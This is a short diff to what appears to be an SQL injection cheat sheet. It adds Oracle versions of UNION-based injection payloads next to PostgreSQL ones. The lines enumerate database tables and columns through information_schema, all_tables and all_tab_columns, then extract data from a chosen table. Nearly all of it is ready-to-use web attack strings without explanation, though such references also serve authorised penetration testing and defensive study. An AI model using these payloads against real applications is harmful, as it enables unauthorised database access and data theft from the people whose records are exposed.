@@ -22,17 +22,21 @@
 
 ' union SELECT table_name,null FROM information_schema.tables-- - >> PostgreSQL
 
+' union SELECT table_name,null FROM all_tables-- - Oracle
+
 
 
 #To fetch column name
 
 SELECT column_name,null FROM information_schema.columns WHERE table_name='table name' >> PostgreSQL
 
+' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - >> Oracle
+
 
 
 #To fetch information from columns
 
-' union select [column name here],null from [table name here]-- -
+' union select [column name here],null from [table name here]-- - >> PostgreSQL, Oracle
 
 
 
